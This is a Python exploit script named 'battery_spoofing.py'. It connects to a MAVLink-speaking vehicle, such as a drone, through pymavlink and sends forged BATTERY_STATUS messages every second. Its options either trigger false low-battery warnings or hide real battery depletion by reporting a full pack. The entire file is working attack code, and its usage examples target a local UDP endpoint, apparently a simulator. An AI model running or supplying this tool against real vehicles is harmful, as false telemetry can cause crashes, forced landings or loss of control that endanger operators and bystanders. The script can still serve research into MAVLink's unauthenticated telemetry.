#!/usr/bin/env python3
"""
Battery Spoofing Exploit Script
Injects false battery telemetry to trigger false warnings or hide depletion
"""

import sys
import time
from pymavlink import mavutil

def inject_battery_spoof(connection, voltage=None, current=None, remaining=None, 
                         battery_id=0, trigger_warning=False, hide_depletion=False):
    """
    Inject spoofed battery data
    
    Args:
        connection: MAVLink connection object
        voltage: Battery voltage in volts (None to use default)
        current: Battery current in amperes (None to use default)
        remaining: Battery remaining percentage (None to use default)
        battery_id: Battery ID (default: 0)
        trigger_warning: If True, set low voltage to trigger warning
        hide_depletion: If True, set high voltage to hide actual depletion
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Default values
    if voltage is None:
        if trigger_warning:
            voltage = 10.0  # Low voltage to trigger warning
        elif hide_depletion:
            voltage = 16.8  # High voltage to hide depletion
        else:
            voltage = 12.6  # Normal voltage
    
    if current is None:
        current = 0.0  # No current draw
    
    if remaining is None:
        if trigger_warning:
            remaining = 10  # Low battery
        elif hide_depletion:
            remaining = 100  # Full battery
        else:
            remaining = 50  # Half battery
    
    # Convert to MAVLink format
    # BATTERY_STATUS uses centi-volts and centi-amps
    voltage_centivolt = int(voltage * 100)
    current_centiamp = int(current * 100)
    
    print(f"[*] Injecting battery spoof:")
    print(f"    Voltage: {voltage}V ({voltage_centivolt} centi-volts)")
    print(f"    Current: {current}A ({current_centiamp} centi-amps)")
    print(f"    Remaining: {remaining}%")
    print(f"    Battery ID: {battery_id}")
    
    # Send BATTERY_STATUS message
    connection.mav.battery_status_send(
        battery_id,
        mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,  # Battery function
        mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,      # Battery type
        0,  # Temperature (0 = unknown)
        [voltage_centivolt] * 10,  # Voltages (10 cells, all same for simplicity)
        current_centiamp,  # Current battery (-1 = unknown)
        remaining,  # Battery remaining (-1 = unknown)
        0,  # Time remaining (seconds, -1 = unknown)
        0   # Charge state (0 = unknown)
    )
    
    print("[+] Battery spoof injected")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 battery_spoofing.py <connection> [voltage] [current] [remaining] [options]")
        print("Example: python3 battery_spoofing.py udp:127.0.0.1:14550")
        print("Example: python3 battery_spoofing.py udp:127.0.0.1:14550 10.0 0 10 --trigger-warning")
        print("Example: python3 battery_spoofing.py udp:127.0.0.1:14550 16.8 0 100 --hide-depletion")
        print("\nOptions:")
        print("  --trigger-warning  Set low battery to trigger warning")
        print("  --hide-depletion   Set high battery to hide actual depletion")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    voltage = float(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].replace('.', '').isdigit() else None
    current = float(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].replace('.', '').isdigit() else None
    remaining = int(sys.argv[4]) if len(sys.argv) > 4 and sys.argv[4].isdigit() else None
    
    trigger_warning = '--trigger-warning' in sys.argv
    hide_depletion = '--hide-depletion' in sys.argv
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Inject battery spoof
    print("[*] Injecting battery spoof (Press Ctrl+C to stop)...")
    try:
        while True:
            inject_battery_spoof(connection, voltage, current, remaining,
                               trigger_warning=trigger_warning,
                               hide_depletion=hide_depletion)
            time.sleep(1)  # Send every second
    except KeyboardInterrupt:
        print("\n[*] Stopping battery spoofing...")

if __name__ == "__main__":
    main()
